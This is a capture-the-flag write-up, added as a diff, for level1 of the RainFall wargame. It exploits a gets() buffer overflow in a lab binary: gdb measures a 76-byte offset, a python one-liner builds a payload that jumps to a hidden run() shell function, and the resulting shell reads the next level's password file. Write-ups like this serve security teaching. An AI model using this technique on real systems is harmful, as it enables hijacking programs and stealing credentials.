@@ -1,0 +1,75 @@
+This is all we go when we arrive in this level
+
+	level1@RainFall:~$ ls -la
+	total 17
+	dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
+	dr-x--x--x  1 root   root    340 Sep 23  2015 ..
+	-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
+	-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
+	-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
+	-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
+	-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
+
+
+
+Step 1: Identify the vulnerability and exploitation path 
+The binary takes user input with gets(), which allows buffer overflow. 
+By examining the code: 
+     
+gdb ./level1
+(gdb) disas main
+ 
+We see main() just calls gets() and returns without any bounds checking. 
+
+There's a hidden run() function: 
+
+    (gdb) info functions
+
+This function prints "Good... Wait what?" and executes system("/bin/sh"). 
+
+Step 2: Find the offset to return address 
+Create a pattern and observe where the binary crashes: 
+     
+	python -c 'print "A" * 80' > /tmp/pattern
+	gdb ./level1
+	(gdb) r < /tmp/pattern
+
+Use GDB to measure the exact offset: 
+ 
+    (gdb) break *0x0804848d    # the lea instruction that computes buf start
+    (gdb) run < <(printf "\n")
+    (gdb) print/x $eax
+    $1 = 0xbffff5f0            # buffer start
+
+    (gdb) break *0x08048496    # the ret instruction
+    (gdb) continue
+    (gdb) print/x $esp
+    $2 = 0xbffff63c            # saved return address location
+
+    (gdb) print/d $2 - $1
+    $3 = 76                    # our offset
+
+Step 3: Create and run the exploit 
+Build the exploit: 76 bytes of padding + address of run() 
+     
+	python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
+
+Run the exploit while keeping STDIN open for the shell: 
+ 
+	cat /tmp/exploit - | ./level1
+
+In the resulting shell, access the level2 password: 
+ 
+cat /home/user/level2/.pass
+ 
+Copy the displayed 19-byte password and use it to log in as level2: 
+ 
+    ssh level2@<IP_ADDRESS> -p 4242
+
+Summary 
+
+     Vulnerability: Buffer overflow in gets() with no boundary checks
+     Technique: Simple stack smashing to redirect execution flow
+     Target: The existing run() function that conveniently calls system("/bin/sh")
+     Key insight: Using cat file - to keep STDIN connected to our terminal after sending the exploit
+     
